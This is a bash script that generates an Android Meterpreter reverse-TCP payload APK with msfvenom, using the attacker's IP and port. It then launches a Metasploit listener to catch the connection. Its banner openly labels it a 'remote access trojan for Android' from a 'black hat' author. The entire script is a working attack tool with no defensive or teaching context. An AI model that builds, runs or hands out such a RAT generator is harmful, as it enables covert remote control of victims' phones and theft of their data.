#!/bin/bash

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

echo -e "\033[0;33m"
echo "Executing the Payload Creator ..."
echo -e "\033[0;36m"

# Get user input
read -p "    Enter your IP/Host Address ===> " ip
read -p "    Enter listener port ===> " Port  
read -p "|---Set the name and path to save the payload
|----> " Path

# Validate inputs
if [[ -z "$ip" || -z "$Port" || -z "$Path" ]]; then
    echo -e "\033[0;31mError: All fields are required!\033[0m"
    echo "Press any key to continue..."
    read -n 1
    exit 1
fi

# Check if msfvenom is available
if ! command_exists msfvenom; then
    echo -e "\033[0;31mError: msfvenom not found!\033[0m"
    echo "Please install metasploit-framework first"
    echo "Press any key to continue..."
    read -n 1
    exit 1
fi

# Create payload with error handling
echo -e "\033[0;33mCreating payload...\033[0m"
if msfvenom -p android/meterpreter/reverse_tcp lhost="$ip" lport="$Port" -o "$Path" 2>/dev/null; then
    echo -e "\033[0;32mPayload created successfully at: $Path\033[0m"
else
    # Try alternative approach if first attempt fails
    echo -e "\033[0;33mTrying alternative method...\033[0m"
    if msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT="$Port" -f apk -o "$Path"; then
        echo -e "\033[0;32mPayload created successfully at: $Path\033[0m"
    else
        echo -e "\033[0;31mFailed to create payload!\033[0m"
        echo "Possible reasons:"
        echo "1. Invalid path or permissions"
        echo "2. Network connectivity issues"
        echo "3. Metasploit installation problem"
        echo "Press any key to continue..."
        read -n 1
        exit 1
    fi
fi

sleep 2
clear

echo -e "\033[0;37m"
 echo -e "\033[0;37m------------------------------------------------" 
echo "     ╔═╗       ╔═╗╔═╗╔═╗╦╔═╗╔╦╗╦ ╦          ╦═╗  ╔═╗  ╔╦╗     "
echo "     ╠╣   ───  ╚═╗║ ║║  ║║╣  ║ ╚╦╝          ╠╦╝  ╠═╣   ║      "
echo "     ╚         ╚═╝╚═╝╚═╝╩╚═╝ ╩  ╩           ╩╚═  ╩ ╩   ╩      "
echo -e "\033[0;31m            POWER OF ATHEX BLACK H4T             "
echo -e "\033[0;29m             REMOTE ACCESS TROJAN FOR ANDROID    "
    echo -e "\033[0;37m---------------------------------------------" 
echo -e "\033[0;29m"

read -p "Do you want to Execute the listener?
 y) Execute the listener
 n) Exit 
 enter y or n (Default y) ===> " yn

echo -e "\033[0;33m"

case $yn in
    y|Y|"") 
        echo "Executing the listener ..."
        # Check if msfconsole is available
        if ! command_exists msfconsole; then
            echo -e "\033[0;31mError: msfconsole not found!\033[0m"
            echo "Please install metasploit-framework first"
            echo "Press any key to continue..."
            read -n 1
            exit 1
        fi
        
        # Execute listener
        echo -e "\033[0;32mStarting Metasploit listener...\033[0m"
        echo -e "\033[0;33mListener configuration:\033[0m"
        echo -e "\033[0;36mIP: $ip\033[0m"
        echo -e "\033[0;36mPort: $Port\033[0m"
        echo -e "\033[0;33mPress Ctrl+C to stop the listener\033[0m"
        sleep 2
        
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
        ;;
    n|N)
        echo "Exiting ..."
        sleep 1
        ;;
    *)
        echo "Invalid choice, exiting..."
        sleep 1
        ;;
esac

echo -e "\033[0m"
echo "Press any key to continue..."
read -n 1